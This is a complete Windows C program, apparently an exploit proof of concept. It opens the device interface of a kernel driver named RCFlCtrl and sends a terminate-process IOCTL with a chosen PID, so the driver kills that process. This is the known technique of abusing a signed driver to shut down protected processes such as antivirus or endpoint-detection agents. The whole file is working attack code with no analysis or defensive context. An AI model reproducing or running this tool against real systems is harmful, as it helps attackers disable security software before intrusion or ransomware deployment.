#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define IOCTL_TERMINATE_PROCESS  0x85000158
#define DEVICE_SYMLINK           "\\\\.\\RCFlCtrl"

static void usage(const char *bin) {
    fprintf(stderr, "usage: %s <pid>\n", bin);
}

static HANDLE open_driver(void) {
    HANDLE h = CreateFileA(DEVICE_SYMLINK, GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        fprintf(stderr, "[-] CreateFile(%s): %lu\n", DEVICE_SYMLINK, GetLastError());
    return h;
}

static BOOL send_kill(HANDLE dev, ULONG64 pid) {
    DWORD ret;
    if (!DeviceIoControl(dev, IOCTL_TERMINATE_PROCESS, &pid, sizeof(pid),
                         NULL, 0, &ret, NULL)) {
        fprintf(stderr, "[-] DeviceIoControl: %lu\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

int main(int argc, char *argv[]) {
    HANDLE dev;
    ULONG64 pid;
    int rc = EXIT_FAILURE;

    if (argc != 2) {
        usage(argv[0]);
        return rc;
    }

    pid = (ULONG64)_atoi64(argv[1]);
    if (pid <= 4) {
        fprintf(stderr, "[-] refusing to target pid %llu\n", pid);
        return rc;
    }

    dev = open_driver();
    if (dev == INVALID_HANDLE_VALUE)
        return rc;

    if (send_kill(dev, pid)) {
        fprintf(stdout, "[+] %llu killed\n", pid);
        rc = EXIT_SUCCESS;
    }

    CloseHandle(dev);
    return rc;
}
 
